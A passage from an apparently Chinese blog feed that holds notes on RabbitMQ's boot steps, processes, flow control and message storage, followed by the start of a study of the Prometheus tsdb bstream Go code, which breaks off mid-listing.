mnesia:sync_transaction操作没有保证Mnesia数据库的日志同步到磁盘上，则调用mnesia_sync:sync()函数的进程进行同步阻塞等待mnesia成功的将数据库</p><p>​       操作日志写入磁盘上</p><p>  6.codec_correctness_check启动步骤</p><p>​     (1).执行rabbit_binary_generator:check_empty_frame_size()函数</p><p>​       确保空的Frame数据格式的正确性</p><p>  7.rabbit_registry启动步骤</p><p>​     (1).执行rabbit_sup:start_child(rabbit_registry)函数</p><p>​       RabbitMQ系统内部各种定义类型注册处理模块的进程，该进程启动了rabbit_registry名字的一个ETS表，用来存储分类，类型名字，以及处理模块的数据</p><p>  8.rabbit_auth_mechanism_cr_demo启动步骤</p><p>​     (1).执行rabbit_registry:register(auth_mechanism, &lt;&lt;”RABBIT-CR-DEMO”&gt;&gt;, rabbit_auth_mechanism_cr_demo)函数</p><p>​       RabbitMQ系统用户验证处理模块之一</p><p>  9.rabbit_auth_mechanism_amqplain启动步骤</p><p>​     (1).执行rabbit_registry:register(auth_mechanism, &lt;&lt;”AMQPLAIN”&gt;&gt;, rabbit_auth_mechanism_amqplain)函数</p><p>​       RabbitMQ系统用户验证处理模块之一</p><p>  10.rabbit_auth_mechanism_plain启动步骤</p><p>​     (1).执行rabbit_registry:register(auth_mechanism, &lt;&lt;”PLAIN”&gt;&gt;, rabbit_auth_mechanism_plain)函数</p><p>​       RabbitMQ系统用户验证处理模块之一</p><p>  11.rabbit_mirror_queue_mode_all启动步骤(高可用队列相关)</p><p>​     (1).执行rabbit_registry:register(ha_mode, &lt;&lt;”all”&gt;&gt;, rabbit_mirror_queue_mode_all)函数</p><p>  12.rabbit_event启动步骤(RabbitMQ系统事件管理器进程)</p><p>​     (1).执行rabbit_sup:start_restartable_child(rabbit_event)函数,启动rabbit_event进程</p><p>​       RabbitMQ系统中所有的事件都是发布到rabbit_event事件管理器中，只要有rabbit_event事件管理器的事件处理进程，则该进程就能接收到所有的事件</p><p>  13.rabbit_exchange_tye_direct启动步骤</p><p>​     (1).执行rabbit_registry:register(exchange, &lt;&lt;”direct”&gt;&gt;, rabbit_exchange_type_direct)函数</p><p>​       RabbitMQ系统exchange交换机direct类型向rabbit_registry进行注册</p><p>  14.rabbit_exchange_type_fanout启动步骤</p><p>​     (1).执行rabbit_registry:register(exchange, &lt;&lt;”fanout”&gt;&gt;, rabbit_exchange_type_fanout)函数</p><p>​       RabbitMQ系统exchange交换机fanout类型向rabbit_registry进行注册</p><p>  15.rabbit_echange_type_headers启动步骤</p><p>​     (1).执行rabbit_registry:register(exchange, &lt;&lt;”headers”&gt;&gt;, rabbit_exchange_type_headers)函数</p><p>​       RabbitMQ系统exchange交换机headers类型向rabbit_registry进行注册</p><p>  16.rabbit_exchange_type_topic启动步骤</p><p>​     (1).执行rabbit_registry:register(exchange, &lt;&lt;”topic”&gt;&gt;, rabbit_exchange_type_topic)函数</p><p>​       RabbitMQ系统exchange交换机topic类型向rabbit_registry进行注册</p><p>​       %% rabbit_topic_trie_node表里存储的是节点数据(里面存储的是topic_trie_node数据结构，所有的路由信息都是从root节点出发)</p><p>​       %% rabbit_topic_trie_edge表里存储的是边数据(里面存储的是topic_trie_node数据结构，边的数据结构里面存储的有路由信息的单个单词)</p><p>​       %% rabbit_topic_trie_binding表里存储的是某个节点上的绑定信息(里面存储的是topic_trie_binding数据结构)</p><p>​       %% 比如路由信息hello.#.nb：</p><p>​       %% 1.有四个节点，第一个节点始终是root节点，然后是其他三个节点，</p><p>​       %% 2.有三条边信息，每个边数据结构里面带有对应的单词hello，#，nb</p><p>​       %% 3.在第四个节点上存在绑定的队列名字</p><p>  17.rabbit_mirror_queue_mode_exactly启动步骤(高可用队列相关)</p><p>​     (1).执行rabbit_registry:register(ha_mode, &lt;&lt;”exactly”&gt;&gt;, rabbit_mirror_queue_mode_exactly)函数</p><p>  18.rabbit_mirror_queue_mode_nodes启动步骤(高可用队列相关)</p><p>​     (1).执行rabbit_registry:register(ha_mode, &lt;&lt;”nodes”&gt;&gt;, rabbit_mirror_queue_mode_nodes)函数</p><p>  19.rabbit_priority_queue启动步骤(启动RabbitMQ系统优先级队列)</p><p>​     (1).执行rabbit_priority_queue:enable()函数</p><p>​       该步骤是允许RabbitMQ系统的队列支持简单的优先级队列</p><p>  20.rabbit_epmd_monitor启动步骤</p><p>​     (1).执行rabbit_sup:start_restartable_child(rabbit_epmd_monitor)函数</p><p>​       该进程主要用来监视epmd进程的存在，有可能epmd进程被无端的删除掉，则该进程发现epmd进程被kill掉后，会立刻进行对epmd进程进行重启</p><p>  21.guid_generator启动步骤(生成独一无二的各种ID对应的模块)</p><p>​     (1).执行rabbit_sup:start_restartable_child(rabbit_guild)函数</p><p>​       RabbitMQ系统中生成唯一16为字符串ID的进程</p><p>  22.rabbit_node_monitor启动步骤</p><p>​     (1).执行rabbit_sup:start_restartable_child(rabbit_node_monitor)函数</p><p>​       RabbitMQ系统中节点管理的进程，该进程会保留集群中的其他节点以及它们对应的GUID，同时节点的删除，增加都会根据该进程通知集群中的其他节点</p><p>  23.delegate_sup启动步骤(多次的向远程节点发送消息，则此代理会将发送到同一个远程节点的多个消息操作统一成一个发送消息操作)</p><p>​     (1).执行rabbit:boot_delegate()函数</p><p>​       RabbitMQ系统中的代理进程监督树，这些代理进程主要用来多次对远程的某个节点进行多次访问，用了代理进程后，可以将多次访问变成一次访问操作</p><p>  24.rabbit_memory_monitor启动步骤</p><p>​     (1).执行rabbit_sup:start_restartable_child(rabbit_memory_monitor)函数</p><p>​       rabbit_memory_monitor进程统计RabbitMQ系统中内存使用情况，它会收到当前系统中所有的消息队列统计的数字，同时将内存使用速率返回给各个消息</p><p>​       队列</p><p>  25.empty_db_check启动步骤(如果RabbitMQ系统是第一次启动则需要插入默认的账号，账号密码，vhost等默认信息)</p><p>​     (1).执行rabbit:maybe_insert_default_data()函数</p><p>​       RabbitMQ系统是第一次启动则需要插入默认的账号，账号密码，vhost等默认信息</p><p>  26.rabbit_mirror_queue_misc启动步骤(高可用队列相关)</p><p>​     (1).执行rabbit_registry:register(policy_validator, &lt;&lt;”ha-mode”&gt;&gt;, rabbit_mirror_queue_misc)函数</p><p>​     (2).执行rabbit_registry:register(policy_validator, &lt;&lt;”ha-params”&gt;&gt;, rabbit_mirror_queue_misc)函数</p><p>​     (3).执行rabbit_registry:register(policy_validator, &lt;&lt;”ha-sync-mode”&gt;&gt;, rabbit_mirror_queue_misc)函数</p><p>​     (4).执行rabbit_registry:register(policy_validator, &lt;&lt;”ha-promote-on-shutdown”&gt;&gt;, rabbit_mirror_queue_misc)函数</p><p>  27.rabbit_policies启动步骤</p><p>​     (1).执行rabbit_policies:register()函数</p><p>​       该启动步骤主要是向rabbit_registry进程注册policy_validator类型的相关数据(主要包括是消息队列的参数类型)</p><p>  28.rabbit_policy启动步骤</p><p>​     (1).执行rabbit_policy:register()函数</p><p>​       该启动步骤主要是向rabbit_registry进程注册runtime_parameter类型的相关数据</p><p>​       该模块是队列和交换机的公用配置参数模块的处理模块</p><p>  29.recovery启动步骤</p><p>​     (1).执行rabbit:recover()函数</p><p>​       该启动步骤主要是恢复所有的持久化队列，将所有的持久化队列进程启动起来，将持久化的交换机信息恢复到非持久化的mnesia数据库表中，</p><p>​       将持久化的绑定信息恢复到非持久化的绑定数据库表中</p><p>  30.mirrored_queues启动步骤(高可用队列相关)</p><p>​     (1).执行rabbit_mirror_queue_misc:on_node_up()函数</p><p>  31.log_relay启动步骤(主要是将error_logger事件中心的事件发布到&lt;&lt;”amq.rabbit.log”&gt;&gt;交换机对应的队列里)</p><p>​     (1).执行rabbit_sup:start_child(rabbit_error_logger_lifecycle, supervised_lifecycle, [rabbit_error_logger_lifecycle, {rabbit_error_logger, start, []},</p><p>​       {rabbit_error_logger, stop, []}]]}}函数</p><p>​       该启动步骤会在rabbit_sup监督进程下启动名字为rabbit_error_logger_lifecylce监督进程，该rabbit_error_logger_lifecylce监督进程执行</p><p>​       supervised_lifecycle:start_link函数，该监督进程的回调初始化函数会执行rabbit_error_logger:start()函数，该函数启动rabbit_error_logger进程，</p><p>​       该进程会处理error_logger事件中心发布的事件，然后将事件依次发布到&lt;&lt;”amq.rabbit.log”&gt;&gt;名字对应的交换机上(&lt;&lt;”amq.rabbit.log”&gt;&gt;交换机会在</p><p>​       rabbit_error_logger事件处理进程启动的时候创建)</p><p>  32.background_gc启动步骤</p><p>​     (1).执行rabbit_sup:start_restartable_child, [background_gc])函数</p><p>​     (该进程启动一个定时器，定时的对RabbitMQ系统进行垃圾回收，定时器的间隔时间是不断变化的，如果垃圾回收的时间过长，则增加时间间隔，反之则减少垃圾回收的时     间间隔)</p><p>  33.networking启动步骤</p><p>​     (1).执行rabbit_networking:boot()函数</p><p>​       根据配置文件中的端口，启动网络连接进程树，等待客户端通过Socket连接过来</p><p>  34.direct_client启动步骤</p><p>​     (1).执行rabbit_direct:boot()函数</p><p>​       启动rabbit_direct_client_sup监督进程，该监督进程的动态启动子进程是执行{rabbit_channel_sup, start_link, []}</p><p>​       所有客户端的连接进程都是启动在rabbit_direct_client_sup监督进程下</p><p>  35.notify_cluster启动步骤</p><p>​     (1).执行rabbit_node_monitor:notify_node_up()函数</p><p>​       通知RabbitMQ集群系统当前节点启动</p><p>application：</p><p>erlang启动application，mnesia是rabbitmq的数据库，用于存储队列消息等持久化信息等。</p><p>erl&gt; application:start(mnesia).</p><p>mnesia:</p><p><img src="/images/image-20201116182515883.png" alt="image-20201116182515883"></p><p>erl&gt;application.start(os_mon).</p><p>os_mon，主要是rabbitmq os_mon，系统监控进程</p><p><img src="/images/image-20201116182607427.png" alt="image-20201116182607427"></p><p>erl&gt;application.start(sasl).</p><p>sasl，sasl的一个重要功能便是可以记录系统进程相关日志，如进程启动、结束、崩溃错误等信息</p><p><img src="/images/image-20201116182627954.png" alt="image-20201116182627954"></p><p>erl&gt;application.start(rabbit).</p><p>rabbit，rabbitmq的主进程。</p><p><img src="/images/image-20201117092111273.png" alt="image-20201117092111273"></p><p><img src="/images/image-20201117092119399.png" alt="image-20201117092119399"></p><p>rabbitmq中有很多application，可以认为每个插件就是一个erlang的application应用。</p><p><img src="/images/image-20201117092141979.png" alt="image-20201117092141979"></p><p>amqp_client是插件amqp_client的客户端的application，用于创建连接。</p><p>rabbitmq_management等其他的是一些插件的application。我们暂时不做详细的分析了。</p><p>rabbit application有比较多的进程，主要的来解释以下：</p><ol><li>background_gc_sup，MQ中的垃圾gc收集器，采用的erlang原生的垃圾收集机制，标记清理的方式来进程gc。</li><li>delegrate代理进程，这些代理进程主要用来多次对远程的某个节点进行多次访问，用了代理进程后，可以将多次访问变成一次访问操作</li><li>file_handle_cache比较重要的，在MQ中主要用于文件读写操作，进行持久化操作。</li><li>mnesia_sync同步数据到磁盘的进程，该操作步骤是启动当前RabbitMQ节点的Mnesia数据库，同时将本节点同集群中的其他节点连接起来，并将集群中的数据同自己本地的数据进行同步，然后将RabbitMQ系统所有的数据库表启动起来。</li><li>rabbitmq_alarm，对磁盘监控之后，告警的进程</li><li>rabbit_disk_monitor_sup，对磁盘使用率监控进程</li><li>epmd_monitor_sup，epmd监控</li><li>error_logger_lifecycle，日志生命周期</li><li>rabbit_event_sup,所有的事件都是发布到rabbit_event事件管理器中，只要有rabbit_event事件管理器的事件处理进程，则该进程就能接收到所有的事件</li><li>rabbit_guid_sup,生成唯一16为字符串ID</li><li>rabbit_memory_monitor_sup，内存监控</li><li>rabbit_node_monitor_sup，节点监控</li><li>rabbit_registry，内部各种定义类型注册处理模块的进程，该进程启动了rabbit_registry名字的一个ETS表，用来存储分类，类型名字，以及处理模块的数据</li><li>vm_memory_monitor：vm_memory监控</li><li>worker_pool_sup:进程池管理进程</li><li>rabbit_direct_client_sup监督进程</li><li>msg_store_persistent,msg_store_transient：一个用于持久消息的存储，一个用于内存不够时，将存储在内存中的非持久化数据转存到磁盘中。所有队列的消息的写入和删除最终都由这两个进程负责处理，而消息的读取则可能是队列本身直接打开文件进行读取，也可能是发送请求由msg_store_persisteng/msg_store_transient进程进行处理</li><li><strong>rabbit_amqqueue_process</strong>：rabbit队列进程，该进程一般在rabbitmq创建队列时被创建，其主要负责消息的接收/投递逻辑</li></ol><h3 id="源码结构"><a href="#源码结构" class="headerlink" title="源码结构"></a>源码结构</h3><p>项目主要代码结构，主要代码都在src目录中；</p><p><img src="/images/image-20201117104124252.png" alt="image-20201117104124252"></p><p>讲几个其中的重要的知识点吧。ORZ；</p><p>1）镜像队列数据同步过程：</p><p><img src="/images/image-20201117104102628.png" alt="image-20201117104102628"></p><p>GM：Guaranteed(保证) Multicast(组播)，用于msg的广播进程，在同步数据的时候比较重要。</p><p>2）流控：rabbitmq在msg的分发的时候对消息的传播速率都做了一定的控制，这样能够保证系统和MQ的稳定性。同时可以提高性能和吞吐。</p><p>credit flow机制：</p><p>MQ主要是通过credit flow的机制来实现流量控制的。通过credit 描述一个元组来进行{InitialCredit，MoreCreditAfter}，对于消息的发送者，credit 开始于InitialCredit当每个消息发送的时候进行递减。消息的接收者可以授权更多的credit给发送者，当正在接受到MoreCreditAfter消息，通过给发送着一个{bump_credit，…}控制消息。发送者应该通过这个消息 handle_bump_msg/1。发送者会阻塞当每次检查clocked/0函数都是为0，如果一个进程即是发送者也是接收者，当他被阻塞的时候，那么他就不会授权更多的credit给他的发送者。因此只有需要检查blocked/0的进程才需要去读取网络sockets。</p><p>%% RabbitMQ系统设置的当前进程能够发送给下游进程消息的最大数为200</p><p>%% RabbitMQ系统设置下游进程在接收上游进程发送的50条消息后，需要通知上游进程增加能够向下游进程发送消息的数量上限</p><p>%% 每次通知上游进程增加向下游进程的发送消息的数量也为50</p><p>3）autoheal </p><p>heal: 治愈</p><p>为了去autoheal我们需要：</p><ol><li>找到获胜的分区</li><li>其他分区停止所有的节点</li><li>等待他们所有都停止</li><li>启动他们</li></ol><p>过程：</p><ol><li>当Mnesia检测出集群出现分区，则从集群中找到第一个节点作为leader节点进行autoheal操作</li><li>Leader节点找出胜利进程和失败进程，胜利者节点收到Leader节点发送过来通知自己成为胜利者的消息</li><li>胜利者节点通知所有的失败者进程自己是Winner节点，然后失败者节点新启动一个进程进行rabbit应用的重启</li><li>当胜利者节点收取到了所有失败者节点的停止后，立刻向所有失败者节点上的新启动的进程发送autoheal_safe_to_start消息，通知失败者节点重新启动rabbit应用</li><li>Leader进程向胜利者进程发送report_autoheal_status消息</li><li>胜利者进程通知Leader进程autoheal操作结束</li></ol><p>4）消息存储过程</p><p><img src="/images/1253350-20180608102448767-1819151383.jpg" alt="img"></p><p>rabbit_channel进程确定了消息将要投递的目标队列，rabbit_amqqueue_process是队列进程，每个队列都有一个对应的进程，实际上rabbit_amqqueue_process进程只是提供了逻辑上对队列的相关操作，他的真正操作是通过调用指定的backing_queue模块提供的相关接口实现的，默认情况该backing_queue的实现模块为rabbit_variable_queue。</p><p>对于普通的没有设置优先级和镜像的队列来说，backing_queue的默认实现是rabbit_variable_queue，其内部通过5个子队列Q1、Q2、Delta、Q3和Q4来实现这4个状态的转换</p><p><img src="/images/1253350-20180608102522017-95525574.jpg" alt="img"></p><p>其中Q1、Q4只包含alpha状态的消息，Q2和Q3包含Beta和gamma状态的消息，Delta只包含delta状态的消息</p><p>在rabbit中，队列中的消息可能会处理以下四种状态：</p><p>alpha：消息内容以及消息在队列中的位置（消息索引）都保存在内存中；</p><p>beta：消息内容只在磁盘上，消息索引只在内存中；</p><p>gamma：消息内容只在磁盘上，消息索引在内存和磁盘上都存在；</p><p>delta：消息的内容和索引都在磁盘上。</p><p>注意：对于持久化消息，消息内容和消息索引都必须先保存在磁盘上，然后才处于上述状态中的一种。其中gamma很少被用到，只有持久化的消息才会出现这种状态。</p><p>rabbit提供这种分类的主要作用是满足不同的内存和CPU需求。alpha最耗内存，但很少消耗CPU；delta基本不消耗内存，但是要消耗更多的CPU以及磁盘I/O操作（delta需要两次I/O操作，一次读索引，一次读消息内容；delta及gamma只需要一次I/O操作来读取消息内容）。</p><p>rabbit在运行时会根据统计的消息传送速度定期计算一个当前内存中能够保存的最大消息数量（target_ram_count），如果内存中的消息数量大于这个数量，就会引起消息的状态转换，转换主要两种：alpha -&gt; beta， beta -&gt; delta。alpha -&gt; beta的转换会将消息的内容写到磁盘（如果是持久化消息，在这一步转换后，消息将会处于gamma状态），beta -&gt; delta的转换会更进一步减少内存消耗，将消息索引也写到磁盘。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>MQ中还有很多重要的特性，还需要后续继续分析学习了。。。。todo…</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="rabbitmq" scheme="http://www.yorzorzy.xyz/categories/rabbitmq/"/>
    
    
      <category term="rabbitmq" scheme="http://www.yorzorzy.xyz/tags/rabbitmq/"/>
    
  </entry>
  
  <entry>
    <title>tsdb源码学习</title>
    <link href="http://www.yorzorzy.xyz/2020/10/10/tsdb%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/"/>
    <id>http://www.yorzorzy.xyz/2020/10/10/tsdb%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-10-10T02:11:50.157Z</published>
    <updated>2020-10-10T02:09:39.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="tsdb源码学习"><a href="#tsdb源码学习" class="headerlink" title="tsdb源码学习"></a>tsdb源码学习</h1><p>tsdb项目结构：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">├── Documentation</span><br><span class="line">│   └── format</span><br><span class="line">│       ├── chunks.md</span><br><span class="line">│       ├── index.md</span><br><span class="line">│       └── tombstones.md</span><br><span class="line">├── LICENSE</span><br><span class="line">├── README.md</span><br><span class="line">├── block.go</span><br><span class="line">├── block_test.go</span><br><span class="line">├── chunkenc</span><br><span class="line">│   ├── bstream.go</span><br><span class="line">│   ├── chunk.go</span><br><span class="line">│   ├── chunk_test.go</span><br><span class="line">│   └── xor.go</span><br><span class="line">├── chunks</span><br><span class="line">│   └── chunks.go</span><br><span class="line">├── cmd</span><br><span class="line">│   └── tsdb</span><br><span class="line">│       ├── Makefile</span><br><span class="line">│       ├── README.md</span><br><span class="line">│       └── main.go</span><br><span class="line">├── compact.go</span><br><span class="line">├── compact_test.go</span><br><span class="line">├── db.go</span><br><span class="line">├── db_test.go</span><br><span class="line">├── encoding_helpers.go</span><br><span class="line">├── fileutil</span><br><span class="line">│   ├── dir_unix.go</span><br><span class="line">│   ├── dir_windows.go</span><br><span class="line">│   ├── fileutil.go</span><br><span class="line">│   ├── mmap.go</span><br><span class="line">│   ├── mmap_unix.go</span><br><span class="line">│   ├── mmap_windows.go</span><br><span class="line">│   ├── preallocate.go</span><br><span class="line">│   ├── preallocate_darwin.go</span><br><span class="line">│   ├── preallocate_linux.go</span><br><span class="line">│   ├── preallocate_other.go</span><br><span class="line">│   ├── sync.go</span><br><span class="line">│   ├── sync_darwin.go</span><br><span class="line">│   └── sync_linux.go</span><br><span class="line">├── head.go</span><br><span class="line">├── head_test.go</span><br><span class="line">├── index</span><br><span class="line">│   ├── encoding_helpers.go</span><br><span class="line">│   ├── index.go</span><br><span class="line">│   ├── index_test.go</span><br><span class="line">│   ├── postings.go</span><br><span class="line">│   └── postings_test.go</span><br><span class="line">├── labels</span><br><span class="line">│   ├── labels.go</span><br><span class="line">│   ├── labels_test.go</span><br><span class="line">│   └── selector.go</span><br><span class="line">├── querier.go</span><br><span class="line">├── querier_test.go</span><br><span class="line">├── test</span><br><span class="line">│   ├── conv_test.go</span><br><span class="line">│   ├── hash_test.go</span><br><span class="line">│   └── labels_test.go</span><br><span class="line">├── testdata</span><br><span class="line">│   └── 20kseries.json</span><br><span class="line">├── testutil</span><br><span class="line">│   └── testutil.go</span><br><span class="line">├── tombstones.go</span><br><span class="line">├── tombstones_test.go</span><br><span class="line">├── tsdbutil</span><br><span class="line">│   ├── buffer.go</span><br><span class="line">│   └── buffer_test.go</span><br><span class="line">├── wal.go</span><br><span class="line">└── wal_test.go</span><br></pre></td></tr></table></figure><h2 id="bstream"><a href="#bstream" class="headerlink" title="bstream"></a>bstream</h2><p>bstream结构体就是Prometheus TSDB中的基础组件之一，它是对 byte切片的封装，提供了读写bit位的功能，主要用于读写时序数据。bstream结构体其核心字段定义如下：</p><ul><li><strong>stream（[]byte类型）</strong>：用于记录数据的byte切片。</li><li><strong>count（uint8类型）</strong>：在写入数据的时候，是逐个byte进行操作的，count字段用来记录当前byte中有多少个bit位是可以写入的，在读取数据的时候，表示当前byte中有多少个bit位是可读的。也就是说，count字段类似于控制写入/读取位置的下标。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bstream is a stream of bits.</span></span><br><span class="line"><span class="keyword">type</span> bstream <span class="keyword">struct</span> &#123;</span><br><span class="line">stream []<span class="keyword">byte</span> <span class="comment">// the data stream</span></span><br><span class="line">count  <span class="keyword">uint8</span>  <span class="comment">// how many bits are valid in current byte</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是writeByte()方法，它提供了写入一个byte的功能，其工作原理如图2-2所示。在图2-3（a）中每次正好写入stream切片的一个元素。需要注意图2-3（b）中展示的这种场景，待写入byte值的高位（10）会写入到bstream.stream切片中的第二个byte元素中，低位（100101）会写入到第三个byte元素中。</p><p><img src="https://pic4.zhimg.com/80/v2-84d3210214a9b2aea184bc6c7c2c7dcf_hd.jpg" alt="img"></p><p>bstream.writeByte()方法的具体实现如下。注意，在通过writeByte()方法写入byte之后，bstream.count字段的值是不需要改变的。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *bstream)</span> <span class="title">writeByte</span><span class="params">(byt <span class="keyword">byte</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> b.count == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="comment">//当前bstream已经完整写完了一个byte, 需要向stream切片中追加一个新的byte元素来完成此次写入</span></span><br><span class="line">b.stream = <span class="built_in">append</span>(b.stream, <span class="number">0</span>)</span><br><span class="line">b.count = <span class="number">8</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">i := <span class="built_in">len</span>(b.stream) - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 再stream切片末尾写入byt</span></span><br><span class="line"><span class="comment">// fill up b.b with b.count bits from byt</span></span><br><span class="line">b.stream[i] |= byt &gt;&gt; (<span class="number">8</span> - b.count)</span><br><span class="line"></span><br><span class="line">    <span class="comment">//如果stream切片中最后一个byte元素剩余的bit位不足8，则需要追加一个byte写入byt剩余的bit位</span></span><br><span class="line">b.stream = <span class="built_in">append</span>(b.stream, <span class="number">0</span>)</span><br><span class="line">i++</span><br><span class="line">b.stream[i] = byt &lt;&lt; b.count</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>bstream.writeBit()方法负责完成一个bit的写入，同时也会更新bstream.count字段，具体实现如下所示：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *bstream)</span> <span class="title">writeBit</span><span class="params">(bit bit)</span></span> &#123;</span><br><span class="line"> <span class="keyword">if</span> b.count == <span class="number">0</span> &#123;</span><br><span class="line"> <span class="comment">// 当前bstream已经完整写完一个byte，需要向stream切片中追加新的byte元素来完成此次写入</span></span><br><span class="line"> b.stream = <span class="built_in">append</span>(b.stream, <span class="number">0</span>)</span><br><span class="line"> b.count = <span class="number">8</span></span><br><span class="line"> &#125;</span><br><span class="line"> i := <span class="built_in">len</span>(b.stream) - <span class="number">1</span> <span class="comment">// 最后一个byte元素的下标</span></span><br><span class="line"> <span class="keyword">if</span> bit &#123; <span class="comment">// 如果bit为1，则需要将该byte元素中对应的位设置为1，如果为0，则不需要设置</span></span><br><span class="line"> b.stream[i] |= <span class="number">1</span> &lt;&lt; (b.count - <span class="number">1</span>)</span><br><span class="line"> &#125;</span><br><span class="line"> b.count-- <span class="comment">// 写入一个bit之后，更新当前byte可用位的数量</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外，writeBits()方法实现了写入一个uint64值的功能，当该值所占的bit位数超过8个时，会首先调用writeByte()方法，按照每8位一个byte的方式写入，然后再调用writeBit()方法写入剩余不足8位的bit值，其实现比较简单，这里不再展开详细介绍。</p><p>介绍完bstream中提供的写入方法之后，下面继续分析bstream中读取相关的方法。首先是readByte()方法，该方法负责读取一个8位的byte，其大致原理如图2-4所示：</p><p><img src="https://pic1.zhimg.com/80/v2-70afd99abb582636ac6466d9d888a91c_hd.jpg" alt="img"></p><p>bstream.readByte()方法实现如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *bstream)</span> <span class="title">readByte</span><span class="params">()</span> <span class="params">(<span class="keyword">byte</span>, error)</span></span> &#123;</span><br><span class="line"> <span class="comment">// 检测当前stream切片是否为空(略)</span></span><br><span class="line"> <span class="comment">// 读取数据时会首先将bstream.count初始化为8，所以会先读取stream切片中的第一个元素</span></span><br><span class="line"> <span class="keyword">if</span> b.count == <span class="number">8</span> &#123; </span><br><span class="line"> b.count = <span class="number">0</span> <span class="comment">// 将count更新为0</span></span><br><span class="line"> <span class="keyword">return</span> b.stream[<span class="number">0</span>], <span class="literal">nil</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> b.count == <span class="number">0</span> &#123; <span class="comment">// count为0表示当前stream切片中的第一个元素已经被读取完毕</span></span><br><span class="line"> b.stream = b.stream[<span class="number">1</span>:] <span class="comment">// 截掉stream切片中第一个byte元素</span></span><br><span class="line"> <span class="comment">// 重新检测stream切片是否为空(略)</span></span><br><span class="line"> <span class="keyword">return</span> b.stream[<span class="number">0</span>], <span class="literal">nil</span> <span class="comment">// 返回stream切片中的第一个byte元素</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 如果count不等于0或8，则此次读取的8个bit需要跨两个byte元素</span></span><br><span class="line"> byt := b.stream[<span class="number">0</span>] &lt;&lt; (<span class="number">8</span> - b.count) <span class="comment">// 从第一个byte元素中读取剩余可读取的bit</span></span><br><span class="line"> b.stream = b.stream[<span class="number">1</span>:] <span class="comment">// 截掉stream切片中的第一个byte元素</span></span><br><span class="line"> <span class="comment">// 